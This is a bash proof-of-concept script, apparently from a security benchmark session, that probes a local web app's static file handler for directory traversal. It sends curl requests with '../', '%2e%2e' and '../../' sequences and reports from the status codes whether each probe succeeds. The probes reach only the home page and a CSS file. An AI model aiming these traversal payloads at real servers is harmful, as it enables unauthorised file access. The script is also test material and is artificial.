#!/bin/bash
# POC: Demonstrates directory traversal vulnerability in static file handler using ../ sequences to escape the static directory and access the home page
# Target: ./repo
# Created: 2025-11-04T19:26:03.488Z
# Session: benchmark-XBEN-015-24-mhkyd2u2

# Directory Traversal POC for Static File Handler
# This script demonstrates the vulnerability allowing path traversal via ../ sequences

TARGET="${1:-http://localhost:8000}"

echo "[*] Directory Traversal POC for Static File Handler"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Basic path traversal - /static/../ should escape to home page
echo "[*] Test 1: Basic path traversal (/static/../)"
echo "[*] Expected: Should return home page content (HTTP 200) instead of 404"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/../")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
CONTENT=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Path traversal successful (HTTP 200)"
    if echo "$CONTENT" | grep -q "<!DOCTYPE\|<html\|<head"; then
        echo "[+] CONFIRMED: Received HTML content (likely home page)"
    fi
else
    echo "[-] Status code: $HTTP_CODE (not vulnerable or endpoint not found)"
fi
echo ""

# Test 2: Path traversal to access CSS file through traversal
echo "[*] Test 2: Path traversal to static CSS (/static/../static/css/style.css)"
echo "[*] Expected: Should return CSS file content (HTTP 200)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/../static/css/style.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
CONTENT=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Path traversal to CSS successful (HTTP 200)"
    if echo "$CONTENT" | grep -q "css\|style\|{"; then
        echo "[+] CONFIRMED: Received CSS-like content"
    fi
else
    echo "[-] Status code: $HTTP_CODE"
fi
echo ""

# Test 3: Try URL-encoded bypass (should not work according to evidence)
echo "[*] Test 3: URL-encoded traversal attempt (/static/%2e%2e/)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/%2e%2e/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "[*] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" != "200" ]; then
    echo "[+] GOOD: URL-encoded traversal blocked"
else
    echo "[!] URL-encoded also works - potentially more severe"
fi
echo ""

# Test 4: Multiple traversal sequences
echo "[*] Test 4: Multiple traversal sequences (/static/../../)"
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/static/../../")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "[*] HTTP Status Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Multiple traversal sequences work"
else
    echo "[*] Multiple sequences blocked or different behavior"
fi
echo ""

echo "[*] POC Complete"